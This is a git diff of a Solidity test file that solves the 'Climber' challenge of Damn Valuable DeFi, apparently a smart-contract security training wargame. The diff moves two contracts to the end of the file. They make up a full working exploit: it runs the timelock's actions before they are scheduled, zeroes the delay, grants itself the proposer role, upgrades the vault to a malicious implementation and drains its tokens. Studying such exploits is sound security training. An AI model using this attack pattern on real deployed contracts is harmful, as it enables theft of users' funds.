@@ -10,61 +10,6 @@ import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
 
-contract MaliciousVaultImpl is ClimberVault {
-    function sweepFunds(address token, address to) external {
-        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
-    }
-}
-
-contract ClimberAttack {
-    ClimberVault private immutable vault;
-    ClimberTimelock private immutable timelock;
-    address private immutable recovery;
-    address private immutable token;
-
-    address[] private targets;
-    uint256[] private values;
-    bytes[] private dataElements;
-    bytes32 private constant SALT = bytes32(0);
-
-    constructor(address payable _vault, address payable _timelock, address _recovery, address _token) {
-        vault = ClimberVault(_vault);
-        timelock = ClimberTimelock(_timelock);
-        recovery = _recovery;
-        token = _token;
-    }
-
-    function attack(address maliciousImpl) external {
-        targets.push(address(timelock));
-        values.push(0);
-        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));
-
-        targets.push(address(timelock));
-        values.push(0);
-        dataElements.push(
-            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this))
-        );
-
-        targets.push(address(vault));
-        values.push(0);
-        dataElements.push(
-            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", maliciousImpl, bytes(""))
-        );
-
-        targets.push(address(this));
-        values.push(0);
-        dataElements.push(abi.encodeWithSignature("scheduleAll()"));
-
-        timelock.execute(targets, values, dataElements, SALT);
-
-        MaliciousVaultImpl(address(vault)).sweepFunds(token, recovery);
-    }
-
-    function scheduleAll() external {
-        timelock.schedule(targets, values, dataElements, SALT);
-    }
-}
-
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -160,5 +105,60 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract MaliciousVaultImpl is ClimberVault {
+    function sweepFunds(address token, address to) external {
+        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
+    }
+}
+
+contract ClimberAttack {
+    ClimberVault private immutable vault;
+    ClimberTimelock private immutable timelock;
+    address private immutable recovery;
+    address private immutable token;
+
+    address[] private targets;
+    uint256[] private values;
+    bytes[] private dataElements;
+    bytes32 private constant SALT = bytes32(0);
+
+    constructor(address payable _vault, address payable _timelock, address _recovery, address _token) {
+        vault = ClimberVault(_vault);
+        timelock = ClimberTimelock(_timelock);
+        recovery = _recovery;
+        token = _token;
+    }
+
+    function attack(address maliciousImpl) external {
+        targets.push(address(timelock));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));
+
+        targets.push(address(timelock));
+        values.push(0);
+        dataElements.push(
+            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this))
+        );
+
+        targets.push(address(vault));
+        values.push(0);
+        dataElements.push(
+            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", maliciousImpl, bytes(""))
+        );
+
+        targets.push(address(this));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("scheduleAll()"));
+
+        timelock.execute(targets, values, dataElements, SALT);
+
+        MaliciousVaultImpl(address(vault)).sweepFunds(token, recovery);
+    }
+
+    function scheduleAll() external {
+        timelock.schedule(targets, values, dataElements, SALT);
     }
 }
